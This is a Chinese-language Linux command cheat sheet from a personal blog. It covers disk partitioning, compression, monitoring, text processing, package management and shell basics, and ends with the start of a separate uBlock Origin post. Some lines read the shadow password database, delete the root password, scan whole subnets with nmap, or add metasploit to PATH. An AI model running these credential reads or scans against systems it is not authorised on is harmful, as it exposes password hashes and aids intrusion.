~/.config/fish/config.fish https://github.com/skywind3000/z.lua https://raw.githubusercontent.com/skywind3000/z.lua/master/z.lua locate yum -y install mlocate #安装 locate locate [文件名] #在数据库中搜索文件名，速度非常快 updatedb #手动更新数据库 /var/lib/mlocate 数据库位置，默认更新周期为 1 天 /etc/updatedb.conf locate 配置文件 ZModem yum -y install lrzsz #安装 ZModem rz #上传文件 对于 Linux Receive（接收） sz #下载文件 对于 Linux Send（发送） parted yum -y install parted #安装 parted -l #输出分区信息 交互命令 help [COMMAND] 获取帮助信息 mklabel 设置分区表，如 gpt 和 msdos mkpart 创建新分区 mkpart PART-TYPE [FS-TYPE] START END print 输出分区信息，可简写为 p free 同时显示磁盘剩余空间 all 显示所有磁盘信息 number 显示指定分区信息 rm 删除分区 select 选择设备 quit 退出，可简写为 q [root@controller ~]$ parted select /dev/sdb #选择设备 p #显示磁盘分区信息 mklabel gpt #将分区表修改为 gpt 格式 mkpart primary 265gb 275gb #创建一个大小为 10GB 的主分区，分区起始位置：265gb，分区结束位置：275gb mkpart primary 275gb 280gb #创建一个大小为 5GB 的主分区，分区起始位置：275gb，分区结束位置：280gb rm 2 #删除大小为 5GB 的分区 p free #同时查看磁盘剩余空间 q #退出 [root@controller ~]$ mkfs.ext4 /dev/sdb1 #格式化为 ext4 文件系统 [root@controller ~]$ mkdir /123 #挂载 [root@controller ~]$ mount /dev/sdb1 /123/ #挂载 [root@controller ~]$ df -h|grep 123 #查看挂载分区 /dev/sdb1 9.6G 138M 9.3G 2% /123 [root@controller ~]$ parted /dev/sdb mklabel gpt mkpart primary 0% 100% q [root@controller ~]$ mkfs.ext4 /dev/sdb1 [root@controller ~]$ mkdir /123 [root@controller ~]$ mount /dev/sdb1 /123 7z yum -y install p7zip* #安装 7z p7zip，p7zip-plugins，7za和7zr是7z的精简版，建议使用7z a 添加到压缩文件 b 基准测试 Benchmark d 从压缩文件中删除 l 列出压缩文件中的内容 t 测试压缩文件 e 解压到当前目录，但没有目录结构，即所有文件都在同一个目录下 x 以完整路径解压 -o 指定输出文件夹 output -mx[0,1,3,5,7,9] 指定压缩级别 7z a 123 * #将当前目录下的所有文件和文件夹都压缩到 123.7z 中 7z a /root/123 /tmp/ #将 /tmp 中的所有内容压缩到 /root 目录中的 123.7z 中 7z l 123.7z #列出压缩文件中的内容 7z x 123.7z #解压 123.7z 中的所有文件到当前目录下 7z x 123.7z -o456 #解压 123.7z 中的所有文件到 456 目录中，456 目录会自动创建 7z a 123 123 -mx9 #将当前文件夹里的 123 文件夹以 ultra 级别压缩到 123.7z 中 ncdu yum -y install ncdu #安装 ncdu 交互命令 n 按文件名排序 s 按文件大小排序 r 重新统计大小 g 切换统计视图 e 显示隐藏文件 d 删除文件/文件夹 i 显示文件/目录信息 ↑↓ 上/下 ←→ 返回/进入 [root@controller ~]$ ncdu /root/ ncdu 1.7 ~ Use the arrow keys to navigate, press ? for help --- /root ----------------------------------------------------------------------- 16.0kiB [ 13.8% ##########] .bash_history 16.0kiB [ 13.8% ##########] /.ssh 12.0kiB [ 10.3% ####### ] install.log 8.0kiB [ 6.9% ##### ] /.novaclient 8.0kiB [ 6.9% ##### ] /.m2 8.0kiB [ 6.9% ##### ] .viminfo 8.0kiB [ 6.9% ##### ] /.karaf 4.0kiB [ 3.4% ## ] install.log.syslog 4.0kiB [ 3.4% ## ] anaconda-ks.cfg 4.0kiB [ 3.4% ## ] .rnd 4.0kiB [ 3.4% ## ] .mysql_history 4.0kiB [ 3.4% ## ] .bashrc 4.0kiB [ 3.4% ## ] .bash_profile 4.0kiB [ 3.4% ## ] .tcshrc 4.0kiB [ 3.4% ## ] .cshrc 4.0kiB [ 3.4% ## ] .bash_logout Total disk usage: 116.0kiB Apparent size: 66.3kiB Items: 30 nethogs yum -y install nethogs #安装 nethogs -d 2 #设置刷新频率为 2 秒，默认 1 秒 delay(延迟) 交互命令 m 切换统计视图 KB/sec -\u0026gt; Total[KB -\u0026gt; B -\u0026gt; MB] s 按发送流量排序 SEND r 按接收流量排序 RECEIVED q 退出 [root@controller ~]$ nethogs eth0 eth1 #同时监视 eth0、eth1 网卡，默认只监视 eth0 NetHogs version 0.8.0 PID USER PROGRAM DEV SENT RECEIVED 2039 qpidd /usr/sbin/qpidd eth0 0.350 0.397 KB/sec 16415 root sshd: root@pts/4 eth0 2.509 0.047 KB/sec 28605 root sshd: root@pts/0 eth0 0.645 0.047 KB/sec 1885 mysql /usr/libexec/mysqld eth0 0.000 0.000 KB/sec ? root unknown TCP 0.000 0.000 KB/sec TOTAL 3.504 0.491 KB/sec iftop yum -y install iftop #安装 iftop -i eth1 #设定监视网卡 交互命令 n 是否解析 IP N 是否解析端口 s 是否显示本地 主机 d 是否显示远端 主机 S 是否显示本地 端口 D 是否显示远端 端口 p 是否显示端口连接 P 是否暂停 b 是否显示平均流量刻度条 B 切换刻度条时间单位 2s，10s，40s l 打开屏幕过滤功能 L 切换刻度条单位 t 切换显示格式 T 是否显示每个连接的总流量 j,k 滚动屏幕 1,2,3 根据右侧3列流量排序 \u0026lt; 根据本地主机名排序 \u0026gt; 根据远端主机名排序 TX 发送Transport cum 运行到目前的总流量 peak 流量峰值 rates 过去2s，10s，40s的平均流量 RX 接收Received TOTAL 总流量 19.1Mb 38.1Mb 57.2Mb 76.3Mb 95.4Mb └────────────────┴─────────────────┴─────────────────┴────────────── 192.168.100.10:ssh =\u0026gt; 192.168.100.151:54315 116KB 4.09Kb 4.09Kb 4.06Kb \u0026lt;= 12.1KB 320b 320b 418b 192.168.100.10:ssh =\u0026gt; 192.168.100.151:53704 687KB 688b 726b 1.49Kb \u0026lt;= 155KB 160b 160b 311b ──────────────────────────────────────────────────────────────────── TX: cum: 14.6MB peak: 11.4Kb rates: 4.77Kb 4.80Kb 5.54Kb RX: 715MB 2.27Kb 480b 480b 730b TOTAL: 729MB 13.7Kb 5.23Kb 5.27Kb 6.26Kb tree yum -y install tree #安装 tree -a #显示所有文件和目录 all -d #只显示目录 directory -f #在文件和目录前显示绝对路径 full -u #在文件和目录前显示所属用户 user -g #在文件和目录前显示所属组 group -s #列出文件和目录大小 size -h #列出文件和目录大小并人性化显示 human -p #列出权限标识 purview -i #不以阶梯状列出文件和目录 Ignore indentation -C #文件夹显示不同颜色 color [root@controller ~]$ tree -a /root /root ├── anaconda-ks.cfg ├── .bash_history ├── .bash_logout ├── .bash_profile ├── .bashrc ├── .cshrc ├── install.log ├── install.log.syslog ├── .novaclient │ └── 21232f297a57a5a743894a0e4a801fc3 │ ├── keypair-human-id-cache │ └── keypair-uuid-cache ├── .rnd ├── .ssh │ ├── id_rsa │ ├── id_rsa.pub │ └── known_hosts ├── .tcshrc └── .viminfo 3 directories, 16 files ssh yum -y install openssh-clients #安装 SSH 套件 ssh-keygen #在 ~/.ssh 目录下生成公钥和私钥 ssh-copy-id user@host #将公钥复制到 user@host 下的 ~/.ssh/authorized_keys 以启用无密码 SSH 登录 ssh user@host #以 SSH 方式登陆远程主机 Tips： 干掉弱密码 [root@controller ~]$ openssl rand -hex 30 #十六进制格式 6ae8592f578b0d2ec704a1ac347cdfc9205d41ede0f853eb15cb28786553 [root@controller ~]$ openssl rand -base64 30 #Base64编码 HTUKtp8wVb2m8ZIIsLtXkQDGKc+V8SeSWJg8yU0Z openssl enc -aes-256-ctr -k 123456 -pbkdf2 -a -p -e -in 1.txt -out 2.txt #加密文件 openssl enc -aes-256-ctr -k 123456 -pbkdf2 -a -p -d -in 2.txt -out 3.txt #解密文件 openssl enc -aes-256-ctr -K 41B2E7F37D50325E29EFF13C247892E53B1813B02388590EBB348A4384633C3E -iv 27B0BD8A2CF2C8568B9AFC9BE79D5C2D -a -p -d -in 2.txt -out 3.txt #通过指定 key 和 iv 解密文件 https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-connectors/native/1.2.14/binaries/tomcat-native-1.2.14-win32-bin.zip scp -r #操作文件夹下的所有文件 Recursive(递归) -P #指定远程主机的 SSH 端口号 [root@controller ~]$ scp -r /tmp/soft root@192.168.100.10:/tmp/ #上传本地目录到远端指定目录 [root@controller ~]$ scp -r root@192.168.100.10:/tmp/soft /tmp/ #从远端下载到本地 rsync -Par -e \u0026#39;ssh -i key.pem\u0026#39; source/ root@192.168.100.10:/destination # 断点续传 find find [路径] [模式] [条件] find / -name 123.log 模式: -name #文件名 -iname #不区分大小写 -path #路径 -ipath #不区分大小写 -nouser #查找没有所有者的文件 -user root #按所有者搜索 -inum 262422 #查找i节点是262422的文件 -atime +10 #查找 10 天前访问的文件 -ctime +10 #查找 10 天前属性改变的文件 -mtime +10 #查找 10 天前修改的文件 + 10 - now 10 天前 10 天当天 10 天内 -size +25k #查找大于25k的文件 + 25 - 0 大于 等于 小于 find . -name \u0026#39;*.ini\u0026#39; #查找当前目录下以 .ini 结尾的文件 find . -size +20k -a -size -50k #查找当前目录下大于20k小于50k的文件 find . -size +20k -a -size -50k -exec ls -lh {} \\; #查找当前目录下大于20k小于50k的文件，并显示详细信息 -o or 逻辑或，两者满足其一即可 -a and 逻辑与，两者都满足 -exec [命令] {} ; 对搜索结果执行命令 Tips : 默认为完全匹配搜索，可使用通配符进行模糊搜索。 sort -u #去重 -f #忽略大小写 -r #以相反顺序来排序（降序） -c #检查文件是否已排序 -t \u0026#34;:\u0026#34; #以 : 为列分隔符 -k 2,2 #以第二列为目标排序 -o 1.txt #将结果写入文件 sort -t \u0026#34;:\u0026#34; -k 3,3r -k 1,1f -o 2.txt 1.txt #以 3、1 列为目标排序，其中 3 列为逆序，1 列忽略大小写 grep grep[选项] 字符串 文件名 在文件当中查找匹配符合条件的字符串 -n #显示行号 -i #忽略大小写 -I #忽略二进制文件 -l #只列出一匹配的文件名称 -L #只列出不匹配的文件名称 -w #只匹配单词 -v #排除指定字符串，取反 -c #只显示匹配到的行的数量 -r #操作文件夹下的所有文件 Recursive(递归) -e #执行多条匹配命令 -A 3 #显示匹配结果的后 3 行 -B 3 #显示匹配结果的前 3 行 -C 3 #显示匹配结果的前 3 行和后 3 行 -3 #Same as -C --color=auto #高亮匹配字符 egrep = grep -E 扩展正则表达式 fgrep = grep -F 匹配多个关键字 grep service 1.txt #输出带有 service 字符的行 grep \u0026#34;ls --color=auto\u0026#34; /etc/ -rn #递归查找并显示行号 Tips : 默认为包含匹配，可使用正则表达式进行包含匹配 ^开头 结尾$ grep ^[a-z] /etc/nova/nova.conf #使用正则表达式去掉注释 grep -vn -e \u0026#39;^\\s*#\u0026#39; -e \u0026#39;^\\s*$\u0026#39; /etc/vsftpd/vsftpd.conf #使用正则表达式取反去掉注释和空行并显示行号 awk awk \u0026#39;{print $2}\u0026#39; 1.txt #输出每一行的第二列到屏幕 awk \u0026#39;{print $0 \u0026gt; \u0026#34;2.txt\u0026#34;}\u0026#39; 1.txt #输出每一行的每一列到文件 awk \u0026#39;NR==1,NR==2 {print $2}\u0026#39; 1.txt #输出第 1、2 行的第 2 列 awk \u0026#39;/必修/ {sum+=$3} END {print sum}\u0026#39; 1.txt #取带有 必修 字符的行，求和第 3 列 /123/ 模拟grep取行 awk -F \u0026#39; \u0026#39; \u0026#39;/read/ {print $2}\u0026#39; 1.txt #以空格为列分隔符，取带有 read 字符的行，输出第 2 列 https://www.ibm.com/developerworks/cn/education/aix/au-gawk/index.html sed -i #将修改写入文件 -e #执行多条编辑命令 命令 s #替换 d #删除 sed -i \u0026#39;s/123/456/g\u0026#39; 1.txt #每一行中的 123 替换为 456 sed -i \u0026#39;s/\\(^\\)/123/\u0026#39; 1.txt #每一行的开头写入 123 sed -i -e \u0026#39;/^$/d\u0026#39; -e \u0026#39;/^#/d\u0026#39; 1.txt #删除 空白行 和 注释行 https://www.gnu.org/software/sed/manual/html_node/sed-commands-list.html#sed-commands-list mount mount #查询系统中已经挂载的设备 mount -a #依据配置文件/etc/fstab的内容，自动挂载 mount [-t 文件系统] [-o特殊选项] 设备文件名 挂载点 #挂载设备 type option umount [设备文件名或挂载点] #卸载设备 -t #一般不必指定，mount 会自动选择正确的类型 光盘、光盘镜像：iso9660 DOS fat16：msdos Windows9x fat32：vfat WindowsNT ntfs：ntfs Windows 网络文件共享：smbfs Linux 网络文件共享：nfs -o #挂载方式 loop：把一个文件当成硬盘分区挂载 ro：采用只读方式挂接设备 rw：采用读写方式挂接设备 iocharset：指定访问文件系统所用字符集 example: 挂载光盘 mount /dev/cdrom(or `sr0`) /mnt/ #把设备文件挂载到空文件夹(挂载点)上 挂载U盘 fdisk -l #查看分区表 mount /dev/sdb1 /mnt/ #把设备文件挂载到空文件夹(挂载点)上，若中文乱码加上`-o iocharset=cp936` 挂载本地镜像 mount -o loop 1.iso /mnt/ Tips： [root@controller ~]$ cat /proc/partitions #同样可以查看分区表 major minor blocks name 8 0 488386584 sda 8 1 204800 sda1 8 2 1024000 sda2 8 3 204800000 sda3 8 4 8192000 sda4 [root@controller ~]$ lsblk #同样可以查看分区表 NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 465.8G 0 disk ├─sda1 8:1 0 200M 0 part /boot/efi ├─sda2 8:2 0 1000M 0 part /boot ├─sda3 8:3 0 195.3G 0 part / └─sda4 8:4 0 7.8G 0 part [SWAP] linux默认是不支持NTFS文件系统的 cp /dev/cdrom /tmp/1.iso #从光盘制作光盘镜像文件 echo echo [选项] [输出内容] -e #激活转义字符，支持反斜线控制的字符转换 \\a 发出警告声 \\f 换行但光标仍旧停留在原来的位置 \\n 换行且光标移至行首 \\t 插入制表符 Tab 键 \\\\ 插入 \\ echo -e \u0026#34;\\e[1;31m 123456 \\e[0m\u0026#34; #输出红颜色 (31m) echo -e \u0026#34;123\\n45\\f6\u0026#34; \u0026gt;\u0026gt; 123 #追加写入文件 alias alias #查看系统中所有的命令别名 alias 别名=\u0026#39;原命令\u0026#39; #设定命令别名，重启失效 unalias 别名 #删除别名 别名永久生效 vi ~/.bashrc 将命令写入环境变量配置文件，每个用户都分别有一个，~代表家目录。 重启后生效，若想直接生效可用 source .bashrc 重新调用。 lsblk -a #显示所有设备 -d #只显示磁盘 -f #显示文件系统信息 [root@controller ~]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 278.9G 0 disk ├─sda1 8:1 0 1000M 0 part /boot ├─sda2 8:2 0 195.3G 0 part / └─sda3 8:3 0 7.8G 0 part [SWAP] 设备名 主要和次要设备号 是否为可移动设备 容量 是否为只读 类型 挂载点 df -a #显示所有文件系统 -h #大小人性化显示 -T #显示文件系统类型 [root@controller ~]$ df -Th Filesystem Type Size Used Avail Use% Mounted on /dev/sda3 ext4 193G 2.7G 180G 2% / tmpfs tmpfs 5.8G 0 5.8G 0% /dev/shm /dev/sda2 ext4 985M 38M 897M 5% /boot /dev/sda1 vfat 200M 260K 200M 1% /boot/efi du -a #同时显示文件大小 -c #同时显示大小总和 -s #仅显示大小总和 -h #大小人性化显示 -S #目录大小不包含子目录的大小 --max-depth=0 #列出小于队列深度的文件夹，0等同于 -s [root@controller ~]$ du -hac #人性化显示所有文件目录及总和的大小 4.0K ./.bash_profile 4.0K ./.bash_logout 4.0K ./installl.log.syslog 4.0K ./.ssh/known_hosts 4.0K ./.ssh/authorized_keys 12K ./.ssh 4.0K ./anaconda-ks.cfg 12K ./installl.log 4.0K ./.bashrc 4.0K ./.cshrc 4.0K ./.viminfo 4.0K ./.bash_history 4.0K ./.tcshrc 64K . 64K total [root@controller ~]$ du --max-depth=1 -h /opt/ #列出各子目录所使用的空间 3.3G /opt/paas 24K /opt/distribution-karaf-0.2.1-Helium-SR1.1 2.7G /opt/iaas 441M /opt/opendaylight 4.2G /opt/centos 21G /opt/ yum -y #对所有提问都回答 yes yum install tree #安装包 yum reinstall tree #重新安装包 yum remove tree #移除包 yum search tree #搜索包 yum list #列出所有包 yum list installed #列出已安装的包 yum update #更新系统 yum check-update #更新包列表 yum repolist #列出源 yum provides /bin/bash #查找某一文件的提供包 yum info bash #查看软件包详情 yum clean all #删除缓存 添加源：add \u0026lt;repo\u0026gt; to /etc/yum.repos.d/ 移除源：remove \u0026lt;repo\u0026gt; from /etc/yum.repos.d/ rpm rpm -ivh --force *rpm #安装 RPM 包 chown chown [选项] [参数] -R #操作文件夹下的所有文件 Recursive(递归) 参数： 用户:组：指定所有者和所属工作组。当省略“:组”，仅改变文件所有者； 文件：指定要改变所有者和工作组的文件列表。支持多个文件和目标，支持shell通配符。 chown user:market file01 #把 file01 给 user，并添加到 market 组中 chmod chmod [选项] [参数] -R #操作文件夹下的所有文件 Recursive(递归) chmod +x file01 #添加可执行权限 chmod 764 file01 #把 file01 的权限改为 rwx rw- r-- rwx rw- r--(333) r=读取 值 = 4 w=写入 值 = 2 x=执行 值 = 1 Tips： 所有用户记录在 /etc/passwd； 所有密码记录在 /etc/shadow； 所有组群记录在 /etc/group。 getent getent passwd #查看用户 getent shadow #查看密码 getent group #查看用户组 getent hosts #查看主机 passwd -d #删除密码 -l #锁住密码 Lock -u #解开锁住的密码 Unlock -S #查看密码的相关信息 Status passwd #更改当前登录用户密码 passwd mysql #更改 mysql 用户的密码 passwd -d root #删除 root 用户的密码，注意删除 root 用户密码后，便不能用 root 用户远程登录了 history history [选项] -c #清空历史命令 -w #把缓存中的历史命令写入历史命令保存文件 ~/.bash_history [root@controller ~]$ echo $HISTSIZE #存储数量由环境变量 `HISTSIZE` 控制，默认1000条 1000 [root@controller ~]$ history 10 #显示最近10条历史命令 92 ls 93 cd .. 94 ls 95 exit 96 ls -a 97 cd .ssh/ 98 ls 99 cat known_hosts 100 exit 101 history 10 !n 执行第 n 条历史命令 !! 执行上一条命令 !abc 执行最后一条以 abc 开头的历史命令 uname -a #显示全部系统信息 -m #电脑类型 -n #主机名称 -v #内核版本 -r #内核发行编号 [root@controller ~]$ uname -a Linux controller 2.6.32-431.el6.x86_64 井1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux lsb_release -a #显示全部发行版本信息 [root@controller ~]$ lsb_release -a LSB Version: :base-4.0-amd64:base-4.0-noarch:core-4.0-amd64:core-4.0-noarch Distributor ID: CentOS Description: CentOS release 6.5 (Final) Release: 6.5 Codename: Final 标准 基础 Tips：LSB 是 Linux Standard Base 的缩写 free -m #以 MB 为单位 -g #以 GB 为单位 -s 1 #每 1 秒更新内存使用情况 [root@controller ~]$ free -g total used free shared buffers cached Mem: 11 2 9 0 0 0 -/+ buffers/cache: 2 9 Swap: 7 0 7 total 内存总数 total=used+free used 已使用的内存 free 空闲内存 shared 废弃内存 buffers 缓存内存 cached 缓存内存 -buffers/cache used-buffers-cached 被程序实实在在使用的内存 +buffers/cache free+buffers+cached 可以被挪用的内存 Swap 交换分区 netstat -a #显示所有端口 -at #显示所有 TCP 端口 -au #显示所有 UDP 端口 -l #只显示监听状态的端口 Listen 同上 -s #显示所有端口的统计信息 同上 -n #不解析 IP -o #显示计时器 -p #显示PID Program name -r #显示核心路由 Route -i #显示网络接口 Interface -c #持续输出网络信息 Continue [root@controller ~]$ netstat -anp | grep ssh #查找进程 tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1604/sshd tcp 0 0 192.168.100.10:22 192.168.100.151:54704 ESTABLISHED 24349/sshd tcp 0 0 :::22 :::* LISTEN 1604/sshd unix 2 [ ] DGRAM 4581866 24349/sshd [root@controller ~]$ netstat -anp | grep \u0026#39;:80\u0026#39; #查找端口 tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN 2330/python tcp 0 0 0.0.0.0:8004 0.0.0.0:* LISTEN 2322/python tcp 0 0 :::80 :::* LISTEN 1884/httpd 查看文件占用 fuser -v 123.txt lsof 123.txt fuser -v 80/tcp -k #终止占用此端口的进程 lsof -i:80 nmap -p - #扫描所有端口 (1-65535) nmap -p 80,443 192.168.1.1-254 #扫描此网段的 80、443 端口 ps -A #显示所有程序 -f #显示所有内容 -e #与 `A` 选项相同 [root@controller ~]$ ps -ef | grep vim #查找进程 所属用户 进程ID 父进程ID 进程名 root 7207 2965 0 11:30 pts/1 00:00:00 vim root 7542 2965 0 11:30 pts/1 00:00:00 grep vim [root@controller ~]$ kill -9 7207 #根据进程 ID 强制终止进程，默认终止进程发送信号15 [root@controller ~]$ pkill -9 -t pts/1 #根据终端 ID 强制终止进程 [root@controller ~]$ pgrep -a -t pts/1 #根据终端 ID 查找进程 [root@controller ~]$ kill -l #列出信号 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGSTKFLT 17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP 21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU 25) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGIO 30) SIGPWR 31) SIGSYS 34) SIGRTMIN 35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3 38) SIGRTMIN+4 39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8 43) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7 58) SIGRTMAX-6 59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2 63) SIGRTMAX-1 64) SIGRTMAX pidof [root@controller ~]# pidof sshd # 返回符合进程名的进程 ID 26051 3192 [root@controller ~]# pgrep sshd 3192 26051 shutdown shutdown [选项] [时间 (now立即) ] -h #关机 -r #重启 -k #只是发布消息 -c #取消前一个关机命令 shutdown -h now #立即关机 shutdown -r now #立即重启 init init [0-6] #切换系统运行级别 runlevel #查询系统当前运行级别 /etc/inittab 系统默认运行级别配置文件,默认为3 initial table 0关机 1单用户 2不完全多用户(不含NFS服务) 3完全多用户(默认字符界面) 4未分配 5图形界面(X11) 6重启 Tips : Ctrl+Alt+F1~7 #在图形界面和字符界面中切换 zip 压缩 zip [压缩文件名] [源文件] #压缩文件 zip -r [压缩文件名] [源目录] #压缩目录 unzip [压缩文件名] #解压缩 gz 压缩 gzip [源文件] #压缩为.gz格式压缩文件，源文件会消失 gzip -r [目录] #分别压缩目录下的所有子文件，不能压缩目录 gunzip or gzip -d [压缩文件] #解压缩 gzip -c [源文件] \u0026gt; [压缩文件] #压缩为.gz格式压缩文件，源文件保留 gzip -c abc \u0026gt; abc.gz bz2 压缩 bzip2 [源文件] #压缩为.bz2格式的压缩文件，源文件会消失 bzip2 -k [源文件] #压缩之后保留源文件 `bunzip2` or `bzip2` -d [压缩文件] [-k 保留源文件] #解压缩 Tips : bzip2不支持目录压缩 tar 压缩 tar -[cxt]f [打包解包文件名] [源文件] -c #打包 -x #解包 -t #测试 -v #显示过程 -f #指定打包后的文件名 -z #打包为 .tar.gz 文件 -j #打包为 .tar.bz2 文件 -J #打包为 .tar.xz 文件 tar -cJf 123.tar.xz 123 #压缩 tar -xJf 123.tar.xz -C /tmp/ #指定解包位置 CentOS 7 hostnamectl hostnamectl set-hostname controller 设置主机名 [root@controller ~]$ hostnamectl Static hostname: controller Icon name: computer-vm Chassis: vm Machine ID: 4c81baeee82945e8a47b4cdeb31bfc42 Boot ID: 2a89be262fa347159bb7243922dee933 Virtualization: vmware Operating System: CentOS Linux 7 (Core) CPE OS Name: cpe:/o:centos:centos:7 Kernel: Linux 3.10.0-514.el7.x86_64 Architecture: x86-64 /etc/system-release #系统版本号 退出登录 logout #退出并执行 ~/.bash_logout exit #退出 Tips : Ctrl+D #快捷键退出 修改环境变量 vi ~/.bash_profile ---- PATH=$PATH:/opt/metasploit-framework/bin 搜索系统命令 whereis [命令名] #查找可执行文件和帮助文件 which [命令名] #查找可执行文件和默认别名 [root@controller ~]$ whereis ls ls: /bin/ls /usr/share/man/man1/ls.1.gz [root@controller ~]$ which ls alias ls=\u0026#39;ls --color=auto\u0026#39; /bin/ls 查看命令帮助 whatis [命令] 相当于 man -f [命令] -k net 查找包含`net`的命令 查看用户登录信息 当前登录用户： w who whoami euid 有效用户 当前操作的用户ID Effective who am i uid 实际用户 登录时使用的用户ID [root@controller ~]$ w 08:28:35 up 1:50, 2 users, load average: 0.02, 0.23, 0.19 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root pts/0 192.168.100.65 06:41 8.00s 0.08s 0.08s -bash root pts/1 192.168.100.151 07:47 0.00s 0.06s 0.00s w [root@controller ~]$ who root pts/0 2016-03-24 06:41 (192.168.100.65) root pts/1 2016-03-24 07:47 (192.168.100.151) last #过去登录用户 last命令默认读取 /var/log/wtmp 文件 lastlog #查询所有用户最后的登录时间 lastlog命令默认读取 /var/log/lastlog 文件 通配符 * 匹配任意字符 123* ? 匹配一个任意字符 12?.log [] 匹配中括号中内的任意一个字符 12[34].log = 123.log or 124.log [-] 匹配中括号中内的任意一个字符，- 代表一个范围。例如：[a-z]代表匹配一个小写字母 [^] 逻辑非，表示匹配不是中括号内的一个字符。例如：[^0-9]代表匹配一个不是数字的字符 管道符 命令1 | 命令2 命令1的正确输出作为命令2的操作对象（命令2必须能处理命令1的输出） ls -l /etc | more netstat -an | grep ESTABLISHED | wc -l keystone tenant-list | grep service | awk \u0026#39;{print $2}\u0026#39; ps -e | grep nova | awk \u0026#39;{print $4}\u0026#39; | sort -u 重定向 覆盖：\u0026gt; 追加：\u0026gt;\u0026gt; 正确输出重定向：命令 1\u0026gt; 文件 #可省略 1 错误输出重定向：命令 2\u0026gt; 文件 输入重定向：命令 \u0026lt; 文件 同时保存输出：命令 \u0026amp;\u0026gt; a.log 分别保存输出：命令 1\u0026gt; a.log 2\u0026gt; b.log 命令连接符 ; 命令1 ; 命令2 命令按顺序依次执行 \u0026amp;\u0026amp; 命令1 \u0026amp;\u0026amp; 命令2 逻辑与，只有当命令1执行成功时，命令2才会执行 || 命令1 || 命令2 逻辑或，只有当命令1执行失败时，命令2才会执行 ls \u0026amp;\u0026amp; echo yes || echo no #判断命令是否执行成功 命令替换符 ls `cat 123` #bash 会先执行 ` ` 包含的命令，其输出会作为另一个命令的参数 后台进程 Ctrl+Z 挂起当前命令 ping 127.0.0.1 \u0026amp; #挂起当前命令 jobs #显示挂起的命令 bg %N #使第 N 个进程在后台运行 back fg %N #使第 N 个进程在前台运行 front Tips : bg 和 fg 不带 %N 时默认对最后一个进程进行操作 自定义登录信息 登录前 /etc/issue 本地设备 /etc/issue.net 远程设备 \\l 显示第几个终端机接口 \\d 日期 \\t 时间 登录后 /etc/motd Message Of The Day 配置 DNS nmcli con show nmcli con mod eno16780032 ipv4.dns 1.2.4.8 nmcli con up eno16780032 cat /etc/resolv.conf ---- # Generated by NetworkManager nameserver 1.2.4.8 脚本 vi hello.sh #!/bin/bash echo -e \u0026#34;\\e[1;36m 123456 \\e[0m\u0026#34; 执行脚本 - chmod 755 hello.sh #赋予执行权限，直接运行 ./hello.sh - bash hello.sh #通过Bash调用执行脚本 Linux 目录 /boot 启动文件目录 /dev 设备文件目录 /etc 配置文件目录 /home 普通用户的家目录 /root 超级用户的家目录 /lib 系统函数库目录 /tmp 临时文件目录 /usr 系统软件资源目录 /opt 第三方软件资源目录 /var 系统文档目录 /proc|/sys 内存挂载点，不能操作 /mnt|/media|/misc 媒体设备挂载点 根目录(/)下的bin和sbin，usr目录(/usr)下的的bin和sbin，这四个目录都是用来保存系统命令的。 区别在于2个sbin目录只有root用户才能执行。 Linux 快捷键（Emacs 风格） Ctrl+L 清屏 （另外 CMD 下的清屏命令是 `cls`） Ctrl+Z 挂起当前命令 Ctrl+C 终止当前命令 Ctrl+D 退出登录 Ctrl+A 光标移动到行首 Ctrl+E 光标移动到行尾 Ctrl+U 剪切光标前的内容 Ctrl+K 剪切光标后的内容 Ctrl+W 剪切光标前的一个单词 Ctrl+Y 粘贴上一次快捷键剪切的内容 Ctrl+? 撤消前一次动作 Ctrl+O 重复执行命令 Ctrl+R 在历史命令中搜索 Ctrl+M 回车键 (Enter) Ctrl+S 暂停屏幕输出 Ctrl+Q 恢复屏幕输出 Ctrl+Alt+F1~7 在图形界面和字符界面中切换 Ctrl+Alt+T 在图形界面中打开终端（CentOS 需要自己设置快捷键） ~+Tab*2 All Present Users on system from \u0026#34;/etc/passwd\u0026#34; @+Tab*2 Entries from \u0026#34;/etc/hosts\u0026#34; $+Tab*2 All Sys variables SecureCRT 快捷键 Alt+B 新建选项卡 Ctrl+Tab 切换选项卡 Alt+2 切换至第 2 个选项卡 Alt+Enter 全屏 Ctrl+Shift+V 粘贴 Shift+Insert 粘贴 ","permalink":"https://xhstormr.github.io/blog/posts/cheatsheet-linux/","summary":"","title":"Linux 命令不完全手册"},{"content":"Updated on 2018-03-23\nuBlock Origin\nuBlock Origin is NOT an \u0026ldquo;ad blocker\u0026rdquo;: it is a wide-spectrum blocker \u0026ndash; which happens to be able to function as a mere \u0026ldquo;ad blocker\u0026rdquo;. The default behavior of uBlock Origin when newly installed is to block ads, trackers and malware sites.\n我把我自定义的 uBlock Origin Filter 整理在这里，以便查阅。\n{ \u0026#34;timeStamp\u0026#34;: 1525574244910, \u0026#34;version\u0026#34;: \u0026#34;1.16.4\u0026#34;, \u0026#34;userSettings\u0026#34;: { \u0026#34;advancedUserEnabled\u0026#34;: true, \u0026#34;alwaysDetachLogger\u0026#34;: false, 